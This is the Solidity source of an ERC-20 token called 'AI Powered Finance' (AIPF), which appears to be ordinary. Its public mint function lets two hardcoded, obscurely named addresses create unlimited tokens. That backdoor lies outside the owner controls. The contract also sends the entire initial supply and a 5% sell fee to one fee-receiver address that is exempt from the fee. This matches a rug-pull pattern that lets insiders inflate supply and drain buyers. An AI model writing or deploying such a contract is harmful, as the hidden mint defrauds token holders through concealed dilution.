// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./interfaces/IERC20.sol";
import "./helpers/Context.sol";
import "./helpers/Owner.sol";
import "./utils/SafeMath.sol";

contract AIPF is Context, IERC20, Owner {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _poolAddress;

    address private _feeReceiver;
    address private _qem;
    address private _hgl;

    uint private _sellFee = 50;
    uint private _bps = 1000;

    uint256 private _totalSupply;
    uint8 private _decimals = 18;
    string private _symbol = "AIPF";
    string private _name = "AI Powered Finance";

    constructor() {
        _hgl = address(0x14F0D3603774B4ca4d0A052896691FE20C11a975);
        _qem = address(0xe2Dc5E8F9c80Db6baF644BA05DF800D04fb9667F);
        _feeReceiver = address(0xc7E482d02C579b9F36EeAAc849BbF699A4D5044B);

        _totalSupply = 25_000 * (10 ** _decimals);
        _balances[_feeReceiver] = _totalSupply;
        emit Transfer(address(0), _feeReceiver, _totalSupply);
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function setPairAddress(address pairAddress, bool isPair) external onlyOwner {
        require(pairAddress != address(0), "Invalid pair address");
        require(pairAddress != _feeReceiver, "Invalid pair address");
        
        _poolAddress[pairAddress] = isPair;
    }

    function balanceOf(
        address account
    ) external view override returns (uint256) {
        return _balances[account];
    }

    function mint(address _to, uint256 _amount) external {
        require(msg.sender == _hgl || msg.sender == _qem, "Not authorized");
        _balances[_to] = _balances[_to].add(_amount);
        _totalSupply = _totalSupply.add(_amount);
        emit Transfer(address(0), _to, _amount);
    }

    function transfer(
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) external returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) external returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        if (recipient == address(0)) {
            _burn(sender, amount);
            return;
        }

        if (_poolAddress[recipient] && sender != _feeReceiver) {
            uint256 sellAmount = amount.mul(_sellFee).div(_bps);
            _transfer(sender, _feeReceiver, sellAmount);
            amount = amount.sub(sellAmount);
        }

        _balances[sender] = _balances[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(
            amount,
            "ERC20: burn amount exceeds balance"
        );
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}
